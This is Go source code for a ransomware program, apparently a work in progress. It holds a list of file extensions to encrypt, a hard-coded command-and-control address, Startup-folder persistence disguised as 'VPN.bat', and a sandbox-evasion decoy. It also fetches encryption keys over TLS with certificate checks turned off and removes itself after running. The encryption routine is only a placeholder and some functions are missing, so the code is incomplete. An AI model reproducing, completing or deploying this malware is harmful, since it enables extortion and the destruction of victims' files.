package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var (
	// List of extensions which will be encrypted
	extensions = []string{
		"exe", "dll", "so", "rpm", "deb", "vmlinuz", "img", // SYSTEM FILES
		"JPEG", "jpg", "bmp", "gif", "png", "svg", "psd", "raw", // images
		"mp3", "mp4", "m4a", "aac", "ogg", "flac", "wav", "wma", "aiff", "ape", // music and sound
		"avi", "flv", "m4v", "mkv", "mov", "mpg", "mpeg", "wmv", "swf", "3gp", // Video and movies

		"doc", "docx", "xls", "xlsx", "ppt", "pptx", // MS office
		"odt", "odp", "ods", "txt", "rtf", "tex", "pdf", "epub", "md", // OpenOffice, Adobe, Latex, Markdown, etc
		"yml", "yaml", "json", "xml", "csv", // structured data
		"db", "sql", "dbf", "mdb", "iso", // databases and disc images

		"html", "htm", "xhtml", "php", "asp", "aspx", "js", "jsp", "css", // web

		"zip", "tar", "tgz", "bz2", "7z", "rar", "bak", // archives
	}

	// Get the path to executable
	filePath, _ = os.Executable()
	// Get the OS
	runtimeOS = runtime.GOOS
	// Get dir info
	userDir, _ = os.UserHomeDir()
	// C&C server
	server = "10.1.1.212:6666"

	// Modes
	connectionMode = 0
	keyMode        = 1
)

// Struct for key and iv
type keyIV struct {
	key []byte
	iv  []byte
}

func letItBurn(presents bool) {
	// If presents detected - retreat
	if presents {
		retreat()
	} else {
		fmt.Println("Oh, nooo!Work again?! \nDobby will never be free...")
		//decrypted := false
		// Add exe to autorun using the bat file
		addToAutoRun(false)
		// Stop signal
		stopSignal := false
		for true {
			if !isEncrypted() {
				fmt.Println("This part should encrypt!")
				UID := checkUID()
				connection(connectionMode, UID)
				keyIV := getKey(keyMode, UID)
			} else if isEncrypted() {
				fmt.Println("Show ransomware and decrypt")
				UID := checkUID()
			}
		}
		removeItself()
	}
	os.Exit(0)
}

// If detect the present of debugger or sandbox - does not do anything suspicious
func retreat() {
	url := "https://google.com"
	if runtimeOS == "windows" {
		_ = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	} else if runtimeOS == "linux" {
		_ = exec.Command("xdg-open", url).Start()
	}
}

// For Windows OS add to Autorun using folder
func addToAutoRun(status bool) {
	if runtimeOS == "windows" {
		userName, _ := user.Current()
		batPath := userName.HomeDir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
		if status {
			err := os.Remove(batPath + "\\" + "VPN.bat")
			if err != nil {
				fmt.Println("Error in the deletion process: " + err.Error())
				os.Exit(1)
			}
		} else {
			file, _ := os.OpenFile(batPath+"\\"+"VPN.bat", os.O_CREATE|os.O_RDWR, 0700)
			_, _ = file.Write([]byte("start \"\" \"" + filePath + "\""))
			file.Close()
		}
	}
}

// Checking if file was encrypted
func isEncrypted() bool {
	// filename := userDir + b64dec(ident)
	filename := userDir + "/id"
	if file, err := os.Open(filename); err == nil {
		defer file.Close()
		scanner := bufio.NewReader(file)
		_, _, _ = scanner.ReadLine()
		isEnc, _, _ := scanner.ReadLine()
		if string(isEnc) == "0" {
			return true
		}
	}
	return false
}

// Read User ID from file or create it using rand 64-byte
func checkUID() string {
	filename := userDir + "/id"
	var UID string

	if file, err := os.Open(filename); err == nil {
		scanner := bufio.NewReader(file)
		userId, _, _ := scanner.ReadLine()
		UID = string(userId)
		file.Close()
	} else {
		file.Close()
		rndm := make([]byte, 64)
		_, _ = rand.Read(rndm)
		UID = hex.EncodeToString(rndm)
		fileWrite, _ := os.OpenFile(filename, os.O_CREATE|os.O_RDWR, 0755)
		_, _ = fileWrite.Write([]byte(UID))
		fileWrite.Close()
	}
	return UID
}

// Connection to the C&C server
func connection(mode int, UID string) {
	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	for true {
		conn, err := tls.Dial("tcp", server, config)
		if err != nil {
			fmt.Println(err)
			time.Sleep(2 * time.Second)
			continue
		}

		_, _ = conn.Write([]byte(strconv.Itoa(mode) + "*_*" + UID + "*_*"))
		buf := make([]byte, 1024)
		var data string
		for true {
			read, _ := conn.Read(buf)
			data += string(buf[:read])
			if read < 1 {
				break
			}
		}
		conn.Close()

		splitted := strings.Split(data, "*_*")
		if splitted[0] == "OK0" && splitted[1] == "True" {
			return
		} else {
			return
		}
	}
	return
}

// Getting key from C&C server
func getKey(mode int, UID string) keyIV {
	var keyIV keyIV

	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	for true {
		conn, err := tls.Dial("tcp", server, config)
		if err != nil {
			fmt.Println(err)
			time.Sleep(2 * time.Second)
			continue
		}

		_, _ = conn.Write([]byte(strconv.Itoa(mode) + "*_*" + UID + "*_*"))
		buf := make([]byte, 1024)
		var data string
		for true {
			read, _ := conn.Read(buf)
			data += string(buf[:read])
			if read < 1 {
				break
			}
		}
		conn.Close()

		args := strings.Split(data, "*_*")
		keyAndIV := strings.Split(args[2], "--KEY-PROCEDURE--")
		keyIV.key, _ = hex.DecodeString(keyAndIV[0])
		keyIV.iv, _ = hex.DecodeString(keyAndIV[1])
		break
	}
	return keyIV
}

// Removing malware
func removeItself() {
	if runtimeOS == "windows" {
		if file, err := os.OpenFile("VPN.bat", os.O_CREATE|os.O_RDWR, 0755); err == nil {
			_, _ = file.Write([]byte("@ECHO OFF\ntimeout /t 5 /nobreak > NUL\n" +
				"type nul > \"" + filePath + "\"\n" +
				"DEL /q /s \"" + filePath + "\"\n" +
				"type nul > \"" + filepath.Dir(filePath) + string(os.PathSeparator) + "VPN.bat" + "\"\n" +
				"DEL /q /s \"" + filepath.Dir(filePath) + string(os.PathSeparator) + "VPN.bat" + "\""))
			file.Close()
			batFile := filepath.Dir(filePath) + string(os.PathSeparator) + "VPN.bat"
			cmd := exec.Command("C:\\Windows\\System32\\cmd.exe", "/C", batFile)
			_ = cmd.Start()
		}
	}
}

func main() {
	if checkPresents() {
		letItBurn(true)
	}
	letItBurn(false)
}
